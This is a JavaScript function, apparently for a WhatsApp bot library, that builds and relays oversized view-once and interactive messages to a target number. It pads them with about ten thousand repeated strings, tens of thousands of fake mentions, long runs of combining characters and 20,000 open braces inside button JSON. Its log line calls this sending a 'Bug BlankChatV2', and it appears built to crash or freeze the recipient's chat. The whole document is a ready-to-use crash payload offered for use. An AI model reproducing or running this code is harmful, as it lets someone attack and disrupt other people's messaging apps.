async function XProtexBlankChatV2(target, Ptcp = true) {
  const XProtex = '_*~@2~*_\n'.repeat(10500);
  const Private = 'ោ៝'.repeat(5000);
  
  const listMents = Array.from({ length: 30000 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );

  let crash = JSON.stringify({
    action: "x",
    data: "x"
  });

  const msg1 = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: listMents,
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash + XProtex + Private + "{".repeat(20000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash + XProtex + Private + "{".repeat(20000),
                },
              ],
            },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await sock.relayMessage(target, msg1.message, {
    messageId: msg1.key.id
  });
  
  let msg2 = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬" + XProtex + Private +"ꦾ".repeat(8000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "{".repeat(20000)
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{".repeat(20000)
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await sock.relayMessage(target, msg2.message, Ptcp ? {
    participant: {
     jid: target
    }
   } : {});
   console.log(chalk.red(`Succes Sending Bug BlankChatV2 By XProtexGlow To ${target}`))
   }
   
//CARA PEMANGGILAN NYA
await XProtexBlankChatV2(target, Ptcp = true);